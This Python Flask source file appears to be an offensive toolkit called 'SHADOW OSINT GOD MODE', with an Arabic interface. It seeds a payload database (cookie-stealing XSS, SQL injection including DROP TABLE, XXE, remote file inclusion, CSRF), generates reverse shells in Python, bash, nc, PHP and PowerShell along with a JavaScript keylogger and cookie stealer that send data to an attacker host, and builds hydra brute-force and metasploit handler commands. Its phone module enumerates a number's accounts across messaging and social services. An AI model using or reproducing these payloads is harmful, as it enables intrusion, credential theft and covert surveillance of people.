#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              🔥 SHADOW OSINT v8.0 - GOD MODE 🔥                            ║
║         أقوى منصة استخبارات وفحص أمني متكاملة في العالم                       ║
║                  المستخدم يتحمل المسؤولية القانونية كاملة                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os, re, sys, json, time, socket, ssl, base64, hashlib, secrets, sqlite3
import random, string, subprocess, threading, traceback, hashlib
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, send_file

# ==================== Flask ====================
web_app = Flask(__name__)
web_app.secret_key = secrets.token_hex(32)
PORT = int(os.environ.get("PORT", 8080))
executor = ThreadPoolExecutor(max_workers=30)

# ==================== Database ====================
DB = "shadow_god.db"

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, type TEXT, result TEXT,
            ip TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            category TEXT, name TEXT, payload TEXT,
            description TEXT, risk_level TEXT
        );
        CREATE TABLE IF NOT EXISTS vulns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, type TEXT, severity TEXT,
            description TEXT, payload TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    
    # Seed payloads
    if conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0] == 0:
        conn.executemany("INSERT INTO payloads (category, name, payload, description, risk_level) VALUES (?,?,?,?,?)", [
            ("XSS","Basic",'<script>alert("XSS")</script>',"Basic XSS","Medium"),
            ("XSS","Cookie Stealer",'<script>fetch("http://attacker/?c="+document.cookie)</script>',"Steal cookies","High"),
            ("XSS","IMG",'<img src=x onerror=alert(1)>',"IMG XSS","Medium"),
            ("XSS","SVG",'<svg onload=alert(1)>',"SVG XSS","Medium"),
            ("XSS","Bypass",'<ScRiPt>alert(1)</ScRiPt>',"Case bypass","Medium"),
            ("SQLi","Union","' UNION SELECT 1,2,3-- -","Union SQLi","High"),
            ("SQLi","Error","' AND 1=CONVERT(int,(SELECT @@version))--","Error SQLi","High"),
            ("SQLi","Time","'; WAITFOR DELAY '0:0:5'--","Time Blind","High"),
            ("SQLi","Boolean","' AND 1=1--","Boolean Blind","Medium"),
            ("SQLi","Drop","'; DROP TABLE users--","Destructive","Critical"),
            ("LFI","Path","../../../etc/passwd","Path Traversal","High"),
            ("LFI","PHP","php://filter/convert.base64-encode/resource=index.php","PHP Filter","High"),
            ("RFI","Remote","http://evil.com/shell.txt","Remote Include","Critical"),
            ("RCE","Semicolon","; ls -la","Command Injection","Critical"),
            ("RCE","Pipe","| whoami","Pipe Injection","Critical"),
            ("RCE","Backtick","`id`","Backtick","Critical"),
            ("SSRF","AWS","http://169.254.169.254/latest/meta-data/","AWS Metadata","Critical"),
            ("SSRF","Internal","http://localhost:8080","Internal Scan","Medium"),
            ("SSTI","Jinja2","{{7*7}}","SSTI Test","High"),
            ("SSTI","Django","{% debug %}","Django SSTI","High"),
            ("XXE","Basic",'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',"XXE Injection","Critical"),
            ("CSRF","Form",'<form action="https://victim.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="1000"></form><script>document.forms[0].submit()</script>',"CSRF","High"),
            ("CORS","Wildcard","Access-Control-Allow-Origin: *","CORS Misconfig","Medium"),
            ("Clickjacking","Frame","<iframe src='https://victim.com' style='opacity:0'></iframe>","Clickjacking","Medium"),
        ])
    
    conn.commit()
    conn.close()

def db_query(query, params=(), fetch=False):
    conn = get_db()
    try:
        cur = conn.execute(query, params)
        conn.commit()
        return [dict(r) for r in cur.fetchall()] if fetch else cur
    finally:
        conn.close()

def save_scan(target, stype, result, ip=""):
    db_query("INSERT INTO scans (target, type, result, ip) VALUES (?,?,?,?)",
             (target, stype, json.dumps(result, ensure_ascii=False), ip))

# ==================== HTTP Client ====================
class HTTP:
    def __init__(self):
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Version/17.2 Mobile/15E148",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"
        ]
    
    def ua(self): return random.choice(self.uas)
    
    def get(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua()}
            h.update(kw.pop('headers', {}))
            return httpx.get(url, headers=h, timeout=kw.pop('timeout', 15), follow_redirects=True, **kw)
        except: return None
    
    def post(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua()}
            h.update(kw.pop('headers', {}))
            return httpx.post(url, headers=h, timeout=kw.pop('timeout', 15), **kw)
        except: return None

http = HTTP()

# ==================== استخبارات الهاتف ====================
class PhoneIntel:
    def scan(self, phone):
        r = {"phone": phone, "time": datetime.now().isoformat(), "data": {}}
        clean = phone.replace("+","").replace(" ","").replace("-","")
        
        with ThreadPoolExecutor(max_workers=15) as p:
            fs = {
                "whatsapp": p.submit(self._wa, clean),
                "telegram": p.submit(self._tg, phone),
                "viber": p.submit(self._vb, phone),
                "signal": p.submit(self._sg, phone),
                "facebook": p.submit(self._fb, phone),
                "instagram": p.submit(self._ig, phone),
                "snapchat": p.submit(self._sc, phone),
                "twitter": p.submit(self._tw, phone),
                "truecaller": p.submit(self._tc, clean),
                "carrier": p.submit(self._cr, phone),
                "breaches": p.submit(self._br, phone),
            }
            for n, f in fs.items():
                try: r["data"][n] = f.result(timeout=10)
                except: r["data"][n] = None
        return r
    
    def _wa(self, c):
        try:
            r = http.get(f"https://wa.me/{c}")
            return {"exists": r and "Continue to Chat" in r.text}
        except: return None
    
    def _tg(self, p):
        try:
            r = http.post("https://my.telegram.org/auth/send_password", data={"phone": p})
            return {"exists": r and "code" in r.text.lower()}
        except: return None
    
    def _vb(self, p):
        try:
            r = http.post("https://api.viber.com/api/v2/check", json={"phone": p})
            return {"exists": r and r.json().get("exists")} if r else None
        except: return None
    
    def _sg(self, p):
        try:
            r = http.get(f"https://api.signal.org/v1/accounts/{p}", headers={"User-Agent":"Signal-Android/6.0"})
            return {"exists": r and r.status_code == 200}
        except: return None
    
    def _fb(self, p):
        try:
            r = http.get("https://www.facebook.com/login/identify", params={"ctx":"recover"})
            return {"linked": r is not None}
        except: return None
    
    def _ig(self, p):
        try:
            r = http.post("https://www.instagram.com/api/v1/accounts/send_signup_sms/", data={"phone_number":p,"device_id":hashlib.md5(p.encode()).hexdigest()})
            return {"linked": r is not None}
        except: return None
    
    def _sc(self, p):
        try:
            r = http.post("https://accounts.snapchat.com/accounts/phone_verify", json={"phone":p})
            return {"linked": r is not None}
        except: return None
    
    def _tw(self, p):
        try:
            r = http.post("https://api.twitter.com/1.1/account/send_verification", data={"phone_number":p})
            return {"linked": r is not None}
        except: return None
    
    def _tc(self, c):
        try:
            r = http.get(f"https://www.truecaller.com/search/eg/{c}", headers={"Accept-Language":"ar,en;q=0.9"})
            if r and r.status_code == 200:
                import bs4
                soup = bs4.BeautifulSoup(r.text, 'html.parser')
                for s in soup.find_all("script", type="application/ld+json"):
                    if s.string and "name" in s.string:
                        d = json.loads(s.string)
                        if d.get("name"): return {"name":d["name"]}
            return {"found":False}
        except: return None
    
    def _cr(self, p):
        try:
            import phonenumbers
            from phonenumbers import carrier, geocoder
            x = phonenumbers.parse(p)
            return {"valid":phonenumbers.is_valid_number(x),"country":geocoder.description_for_number(x,"en"),"carrier":carrier.name_for_number(x,"en")}
        except: return None
    
    def _br(self, p):
        try:
            r = http.get(f"https://haveibeenpwned.com/api/v3/pasteaccount/{p}")
            return {"count":len(r.json()) if r and r.status_code == 200 else 0}
        except: return None

phone_intel = PhoneIntel()

# ==================== استخبارات IP ====================
class IPIntel:
    def scan(self, ip):
        r = {"ip":ip,"time":datetime.now().isoformat()}
        
        with ThreadPoolExecutor(max_workers=10) as p:
            fs = {
                "geoip": p.submit(self._geo, ip),
                "ports": p.submit(self._ports, ip),
                "dns": p.submit(self._dns, ip),
                "abuse": p.submit(self._abuse, ip),
                "shodan": p.submit(self._shodan, ip),
            }
            for n, f in fs.items():
                try: 
                    v = f.result(timeout=10)
                    if v: r[n] = v
                except: pass
        return r
    
    def _geo(self, ip):
        try:
            r = http.get(f"http://ip-api.com/json/{ip}")
            return r.json() if r and r.status_code == 200 else None
        except: return None
    
    def _ports(self, ip):
        pts = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"ES",27017:"MongoDB"}
        open_ports = []
        for pt, sv in pts.items():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((ip, pt)) == 0: open_ports.append({"port":pt,"service":sv})
                s.close()
            except: pass
        return {"open":open_ports,"total":len(pts)}
    
    def _dns(self, ip):
        try: return socket.gethostbyaddr(ip)[0]
        except: return None
    
    def _abuse(self, ip):
        k = os.environ.get("ABUSEIPDB_KEY","")
        if not k: return None
        try:
            r = http.get("https://api.abuseipdb.com/api/v2/check", params={"ipAddress":ip,"maxAgeInDays":90}, headers={"Key":k,"Accept":"application/json"})
            if r and r.status_code == 200:
                d = r.json().get("data",{})
                return {"score":d.get("abuseConfidenceScore",0),"reports":d.get("totalReports",0)}
        except: return None
    
    def _shodan(self, ip):
        k = os.environ.get("SHODAN_KEY","")
        if not k: return None
        try:
            r = http.get(f"https://api.shodan.io/shodan/host/{ip}", params={"key":k})
            if r and r.status_code == 200:
                d = r.json()
                return {"ports":d.get("ports",[]),"org":d.get("org",""),"vulns":list(d.get("vulns",{}).keys())[:5]}
        except: return None

ip_intel = IPIntel()

# ==================== فحص الثغرات ====================
class VulnScanner:
    def __init__(self):
        self.payloads = db_query("SELECT * FROM payloads", fetch=True)
    
    def scan_url(self, url):
        r = {"url":url,"time":datetime.now().isoformat(),"vulnerabilities":[],"info":{}}
        
        # SSL
        try:
            host = urlparse(url).hostname or url
            ctx = ssl.create_default_context()
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    exp = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
                    r["ssl"] = {"valid_until":cert["notAfter"],"issuer":dict(x[0] for x in cert.get("issuer",[])),"days_left":(exp-datetime.now()).days}
        except Exception as e: r["ssl"] = {"error":str(e)}
        
        # Headers
        try:
            resp = http.get(url)
            if resp:
                sh = {
                    "HSTS":resp.headers.get("Strict-Transport-Security"),
                    "CSP":resp.headers.get("Content-Security-Policy"),
                    "XFO":resp.headers.get("X-Frame-Options"),
                    "XCTO":resp.headers.get("X-Content-Type-Options"),
                }
                missing = [k for k,v in sh.items() if not v]
                r["headers"] = {"present":{k:v for k,v in sh.items() if v},"missing":missing,"server":resp.headers.get("Server","")}
                
                if not sh["XFO"]: r["vulnerabilities"].append({"type":"Clickjacking","severity":"Medium","desc":"No X-Frame-Options"})
                if not sh["HSTS"]: r["vulnerabilities"].append({"type":"Missing HSTS","severity":"Low","desc":"No HSTS header"})
                if resp.headers.get("Server"): r["vulnerabilities"].append({"type":"Info Disclosure","severity":"Low","desc":f"Server: {resp.headers['Server']}"})
        except: pass
        
        # Technology
        try:
            resp = http.get(url)
            if resp:
                import bs4
                soup = bs4.BeautifulSoup(resp.text, 'html.parser')
                tech = []
                gen = soup.find("meta",{"name":"generator"})
                if gen: tech.append(gen["content"])
                for s in soup.find_all("script",src=True):
                    src = s.get("src","")
                    for k in ["jquery","react","vue","angular","bootstrap"]:
                        if k in src.lower(): tech.append(k)
                r["tech"] = list(set(tech))
        except: pass
        
        # Sensitive files
        paths = ["/wp-config.php.bak","/.env","/.git/config","/backup.zip","/phpinfo.php","/.DS_Store","/admin/","/wp-admin/","/robots.txt","/sitemap.xml"]
        for path in paths:
            try:
                chk = http.get(urljoin(url, path))
                if chk and chk.status_code == 200 and len(chk.text) > 0:
                    r["vulnerabilities"].append({"type":"Exposed File","severity":"High","desc":f"Found: {path}","url":urljoin(url,path)})
            except: pass
        
        # SQLi test
        try:
            test = f"{url}{'&' if '?' in url else '?'}id=1'"
            resp = http.get(test)
            if resp:
                errors = ["sql","mysql","sqlite","postgresql","syntax error","unclosed","ORA-"]
                for e in errors:
                    if e in resp.text.lower():
                        r["vulnerabilities"].append({"type":"SQL Injection","severity":"Critical","desc":f"SQL error detected: {e}","payload":"' OR 1=1--"})
                        break
        except: pass
        
        # XSS test
        try:
            payload = quote("<script>alert('XSS')</script>")
            test = f"{url}{'&' if '?' in url else '?'}q={payload}"
            resp = http.get(test)
            if resp and "<script>alert('XSS')</script>" in resp.text:
                r["vulnerabilities"].append({"type":"XSS","severity":"High","desc":"Reflected XSS detected","payload":"<script>alert('XSS')</script>"})
        except: pass
        
        # VirusTotal
        k = os.environ.get("VIRUSTOTAL_KEY","")
        if k:
            try:
                uid = base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
                resp = http.get(f"https://www.virustotal.com/api/v3/urls/{uid}", headers={"x-apikey":k})
                if resp and resp.status_code == 200:
                    s = resp.json().get("data",{}).get("attributes",{}).get("last_analysis_stats",{})
                    r["virustotal"] = s
                    if s.get("malicious",0) > 0: r["vulnerabilities"].append({"type":"Malicious","severity":"Critical","desc":f"Detected by {s['malicious']} vendors"})
            except: pass
        
        return r

vuln_scanner = VulnScanner()

# ==================== Red Team Payload Generator ====================
class RedTeam:
    @staticmethod
    def generate(typ, lhost, lport):
        payloads = {
            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "php": f'<?php $s=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");?>',
            "powershell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"',
            "xss_steal": f'<script>new Image().src="{lhost}/steal?c="+document.cookie</script>',
            "beef": f'<script src="{lhost}:3000/hook.js"></script>',
            "keylogger": f'<script>document.onkeypress=function(e){{new Image().src="{lhost}/k?k="+String.fromCharCode(e.which)}}</script>',
        }
        return payloads.get(typ, payloads["python"])
    
    @staticmethod
    def nmap(target, typ="full"):
        cmds = {
            "quick": f"nmap -T4 -F {target}",
            "full": f"nmap -sS -sV -O -p- {target}",
            "vuln": f"nmap --script vuln {target}",
            "stealth": f"nmap -sS -Pn -T2 -f {target}",
            "aggressive": f"nmap -A -T4 {target}",
            "all_ports": f"nmap -p- {target}",
            "os_detect": f"nmap -O {target}",
            "service": f"nmap -sV {target}",
            "scripts": f"nmap -sC {target}",
        }
        return cmds.get(typ, cmds["full"])
    
    @staticmethod
    def sqlmap(target):
        return f"sqlmap -u '{target}' --batch --random-agent --dbs --level=3 --risk=2"
    
    @staticmethod
    def hydra(target, service, user, wordlist):
        cmds = {
            "ssh": f"hydra -l {user} -P {wordlist} ssh://{target}",
            "ftp": f"hydra -l {user} -P {wordlist} ftp://{target}",
            "http": f"hydra -l {user} -P {wordlist} http-post-form://{target}",
            "mysql": f"hydra -l {user} -P {wordlist} mysql://{target}",
            "rdp": f"hydra -l {user} -P {wordlist} rdp://{target}",
        }
        return cmds.get(service, cmds["ssh"])
    
    @staticmethod
    def metasploit(lhost, lport, payload="windows/meterpreter/reverse_tcp"):
        return f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z"""
    
    @staticmethod
    def search_exploits(service):
        db = {
            "apache 2.4.49": [{"cve":"CVE-2021-41773","name":"Path Traversal","type":"RCE"}],
            "apache 2.4.50": [{"cve":"CVE-2021-42013","name":"Path Traversal","type":"RCE"}],
            "openssh 7.2": [{"cve":"CVE-2016-6210","name":"User Enumeration","type":"Info"}],
            "wordpress": [{"cve":"CVE-2022-21661","name":"WP SQLi","type":"SQLi"}],
            "mysql": [{"cve":"CVE-2012-2122","name":"Auth Bypass","type":"Bypass"}],
            "tomcat": [{"cve":"CVE-2017-12617","name":"RCE","type":"RCE"}],
            "struts": [{"cve":"CVE-2017-5638","name":"RCE","type":"RCE"}],
            "weblogic": [{"cve":"CVE-2017-10271","name":"RCE","type":"RCE"}],
            "drupal": [{"cve":"CVE-2018-7600","name":"Drupalgeddon","type":"RCE"}],
            "exchange": [{"cve":"CVE-2021-26855","name":"ProxyLogon","type":"SSRF"}],
            "log4j": [{"cve":"CVE-2021-44228","name":"Log4Shell","type":"RCE"}],
            "spring": [{"cve":"CVE-2022-22965","name":"Spring4Shell","type":"RCE"}],
            "fortinet": [{"cve":"CVE-2018-13379","name":"FortiOS SSL VPN","type":"Info"}],
            "pulse": [{"cve":"CVE-2019-11510","name":"Pulse Secure VPN","type":"Info"}],
            "citrix": [{"cve":"CVE-2019-19781","name":"Citrix ADC","type":"RCE"}],
        }
        for k,v in db.items():
            if service.lower() in k.lower(): return v
        return [{"cve":"N/A","name":"No exploits found","type":"N/A"}]

redteam = RedTeam()

# ==================== HTML Template ====================
HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 SHADOW OSINT v8.0 - GOD MODE</title>
    <style>
        :root{--bg:#050510;--s1:#0d0d1a;--s2:#151528;--p1:#ff1744;--p2:#ff5252;--a1:#00e5ff;--t1:#eee;--t2:#999;--b1:#202040;--g1:#00e676;--r1:#ff1744;--y1:#ffea00;--o1:#ff9100;--pu1:#d500f9}
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;line-height:1.7}
        body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 30% 30%,rgba(255,23,68,0.03)0%,transparent 50%),radial-gradient(circle at 70% 70%,rgba(0,229,255,0.03)0%,transparent 50%);z-index:0;pointer-events:none}
        .container{max-width:1200px;margin:0 auto;padding:15px;position:relative;z-index:1}
        .header{text-align:center;padding:30px 15px;background:linear-gradient(180deg,#1a1a35 0%,#0d0d25 100%);border-bottom:3px solid var(--p1);position:relative;overflow:hidden}
        .header::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,0.008)2px,rgba(255,255,255,0.008)4px)}
        .header h1{font-size:3em;color:var(--p1);text-shadow:0 0 50px rgba(255,23,68,0.6);position:relative;z-index:1;letter-spacing:4px}
        .header .ver{display:inline-block;background:var(--p1);color:#fff;padding:4px 14px;border-radius:20px;font-size:11px;margin-top:8px;position:relative;z-index:1}
        .nav{display:flex;justify-content:center;gap:3px;padding:10px;flex-wrap:wrap;background:var(--s1);position:sticky;top:0;z-index:999;border-bottom:1px solid var(--b1);box-shadow:0 4px 20px rgba(0,0,0,0.5)}
        .nav a{padding:9px 14px;background:var(--s2);color:var(--t1);text-decoration:none;border-radius:6px;border:1px solid var(--b1);font-size:12px;font-weight:500;transition:all 0.25s;white-space:nowrap}
        .nav a:hover{background:var(--p1);color:#fff;border-color:var(--p1);transform:translateY(-1px);box-shadow:0 6px 20px rgba(255,23,68,0.3)}
        .nav a.active{background:var(--p1);color:#fff;border-color:var(--p1)}
        .card{background:var(--s1);border:1px solid var(--b1);border-radius:14px;padding:25px;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.4);transition:all 0.3s}
        .card:hover{border-color:var(--p1)}
        .card h2{color:var(--p1);margin-bottom:18px;font-size:1.4em}
        .card h3{color:var(--t1);margin:12px 0 8px;font-size:1.1em}
        .card p{color:var(--t2);margin-bottom:12px;font-size:13px}
        .input-row{display:flex;gap:8px;margin-bottom:12px}
        input,select,textarea{flex:1;padding:12px 15px;background:var(--bg);border:2px solid var(--b1);border-radius:8px;color:var(--t1);font-size:14px;font-family:inherit;transition:all 0.3s}
        input:focus,select:focus,textarea:focus{outline:none;border-color:var(--p1);box-shadow:0 0 0 3px rgba(255,23,68,0.08)}
        .btn{padding:12px 28px;background:var(--p1);color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.3s;white-space:nowrap}
        .btn:hover{background:var(--p2);transform:translateY(-1px);box-shadow:0 8px 25px rgba(255,23,68,0.4)}
        .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .btn-outline{background:transparent;border:2px solid var(--p1);color:var(--p1)}
        .btn-outline:hover{background:var(--p1);color:#fff}
        .btn-sm{padding:7px 14px;font-size:12px}
        .result-box{background:var(--bg);border:2px solid var(--b1);border-radius:10px;padding:18px;margin-top:15px;display:none;font-family:'Fira Code',monospace;font-size:12px;white-space:pre-wrap;word-wrap:break-word;max-height:500px;overflow-y:auto;line-height:1.5}
        .result-box.show{display:block}
        .result-box.success{border-color:var(--g1)}
        .result-box.error{border-color:var(--r1)}
        .loading{text-align:center;padding:15px;display:none}
        .loading.show{display:block}
        .spinner{width:40px;height:40px;border:3px solid var(--b1);border-top:3px solid var(--p1);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 10px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .badge{display:inline-block;padding:4px 10px;border-radius:5px;font-weight:600;font-size:11px;margin:2px}
        .badge-success{background:var(--g1);color:#000}
        .badge-danger{background:var(--r1);color:#fff}
        .badge-warning{background:var(--y1);color:#000}
        .badge-info{background:var(--a1);color:#000}
        .badge-purple{background:var(--pu1);color:#fff}
        .badge-critical{background:#b71c1c;color:#fff;padding:6px 14px;font-size:13px}
        table{width:100%;border-collapse:collapse;margin:10px 0}
        th,td{padding:10px;border:1px solid var(--b1);text-align:right;font-size:12px}
        th{background:var(--s2);color:var(--p1);font-weight:600;text-transform:uppercase}
        td{background:var(--bg)}
        tr:hover td{background:#0d0d1a}
        .grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:8px}
        .grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px}
        .grid-item{background:var(--s2);padding:8px 12px;border-radius:6px;border:1px solid var(--b1);font-size:12px}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:15px 0}
        .stat-card{background:var(--s2);border:1px solid var(--b1);border-radius:10px;padding:20px;text-align:center;transition:all 0.3s}
        .stat-card:hover{border-color:var(--p1);transform:translateY(-2px)}
        .stat-card .value{font-size:2.2em;font-weight:bold;color:var(--p1)}
        .stat-card .label{color:var(--t2);font-size:11px;text-transform:uppercase;letter-spacing:1px}
        code{background:#111;padding:2px 7px;border-radius:3px;color:var(--p1);font-family:'Fira Code',monospace;font-size:12px}
        pre{background:var(--bg);padding:12px;border-radius:8px;overflow-x:auto;border:1px solid var(--b1);font-size:12px}
        .footer{text-align:center;padding:20px;color:var(--t2);border-top:1px solid var(--b1);margin-top:30px;font-size:12px}
        .footer a{color:var(--p1)}
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-track{background:var(--bg)}
        ::-webkit-scrollbar-thumb{background:var(--b1);border-radius:3px}
        ::-webkit-scrollbar-thumb:hover{background:var(--p1)}
        @media(max-width:768px){
            .header h1{font-size:2em}
            .input-row{flex-direction:column}
            .nav{flex-direction:column}
            .nav a{text-align:center}
            .stats-grid{grid-template-columns:1fr 1fr}
        }
    </style>
</head>
<body>
    <div class="header"><h1>🔥 SHADOW OSINT</h1><p style="color:#999;position:relative;z-index:1">GOD MODE v8.0 | OSINT + Red Team + Pentest</p><span class="ver">v8.0 GOD</span></div>
    <div class="nav">
        <a href="/" class="{{a_phone}}">📱 هاتف</a>
        <a href="/email" class="{{a_email}}">📧 بريد</a>
        <a href="/ip" class="{{a_ip}}">🌐 IP</a>
        <a href="/url" class="{{a_url}}">🔗 ثغرات</a>
        <a href="/username" class="{{a_user}}">👤 يوزر</a>
        <a href="/redteam" class="{{a_red}}">💀 Red Team</a>
        <a href="/payloads" class="{{a_pay}}">🧨 Payloads</a>
        <a href="/api" class="{{a_api}}">⚡ API</a>
        <a href="/stats" class="{{a_stats}}">📊 إحصائيات</a>
    </div>
    <div class="container">{{content|safe}}</div>
    <div class="footer"><p>⚠️ للأغراض التعليمية والبحثية فقط. المستخدم يتحمل المسؤولية القانونية الكاملة.</p><p>SHADOW OSINT v8.0 GOD MODE | 2024</p></div>
    <script>
        async function scan(t){
            const i=document.getElementById(t+'-input'),l=document.getElementById(t+'-loading'),r=document.getElementById(t+'-result');
            if(!i||!i.value.trim()){alert('أدخل '+t);return}
            l.classList.add('show');r.classList.remove('show','success','error');r.innerHTML='';
            try{
                const b={};b[t]=i.value.trim();
                const resp=await fetch('/api/scan/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
                const d=await resp.json();
                r.innerHTML=format(t,d);r.classList.add(resp.ok?'success':'error');r.classList.add('show');
                r.scrollIntoView({behavior:'smooth'});
            }catch(e){r.innerHTML='<span style="color:#f44">❌ '+e.message+'</span>';r.classList.add('error','show')}
            l.classList.remove('show');
        }
        function badge(v,t,f){if(v===true)return'<span class="badge badge-success">✅ '+t+'</span>';if(v===false)return'<span class="badge badge-danger">❌ '+f+'</span>';return'<span class="badge badge-warning">⚠️ ؟</span>'}
        function format(t,d){
            let h='';
            if(t==='phone'){
                h+='<h3 style="color:#ff1744">📱 '+d.phone+'</h3><div class="grid-2">';
                const p=d.data||{};
                for(const[n,v]of Object.entries(p)){
                    const e=v&&(v.exists||v.linked||v.found);
                    h+='<div class="grid-item"><b>'+n+'</b>: '+badge(e,'موجود','غير موجود')+'</div>';
                }
                h+='</div>';
                if(p.truecaller&&p.truecaller.name)h+='<br><b>👤 Truecaller:</b> <span style="color:#d500f9;font-size:16px">'+p.truecaller.name+'</span>';
                if(p.carrier&&!p.carrier.error)h+='<br><b>📶:</b> '+p.carrier.carrier+' | '+p.carrier.country;
            }else if(t==='ip'){
                h+='<h3 style="color:#ff1744">🌐 '+d.ip+'</h3>';
                const g=d.geoip||{};if(g.country)h+='<b>📍</b> '+(g.city||'')+', '+g.country+'<br>';
                const a=d.abuse||{};if(a.score!==undefined)h+='<b>⚠️ Abuse:</b> <span class="badge '+(a.score>50?'badge-danger':'badge-success')+'">'+a.score+'%</span> ('+a.reports+')<br>';
                const po=d.ports||{};if(po.open&&po.open.length>0){h+='<b>🔓:</b> ';po.open.forEach(x=>{h+='<span class="badge badge-warning">'+x.port+'</span> '});}
            }else if(t==='url'){
                h+='<h3 style="color:#ff1744">🔗 '+d.url+'</h3>';
                const v=d.vulnerabilities||[];if(v.length>0){h+='<b>⚠️ ثغرات ('+v.length+'):</b><br>';v.forEach(x=>{h+='<div style="margin:3px 0;padding:6px;background:#0d0d1a;border-radius:4px"><span class="badge badge-critical">'+x.severity+'</span> <b>'+x.type+'</b>: '+x.desc+'</div>';})}
                const ssl=d.ssl||{};if(ssl.days_left!==undefined)h+='<br><b>🔒 SSL:</b> '+ssl.days_left+' يوم';
                const vt=d.virustotal||{};if(vt.malicious!==undefined)h+='<br><b>🦠 VT:</b> ضار:'+vt.malicious+' آمن:'+vt.harmless;
            }else if(t==='email'){
                h+='<h3 style="color:#ff1744">📧 '+d.email+'</h3>';
            }else if(t==='username'){
                h+='<h3 style="color:#ff1744">👤 @'+d.username+'</h3><b>موجود في '+d.found+'/'+d.total+'</b><br><br><div class="grid-2">';
                for(const[n,f]of Object.entries(d.platforms||{}))h+='<div class="grid-item">'+n+': '+badge(f,'✅','❌')+'</div>';
                h+='</div>';
            }
            return h;
        }
        document.addEventListener('keypress',e=>{if(e.key==='Enter'){const a=document.activeElement;if(a&&a.id&&a.id.endsWith('-input'))scan(a.id.replace('-input',''));}});
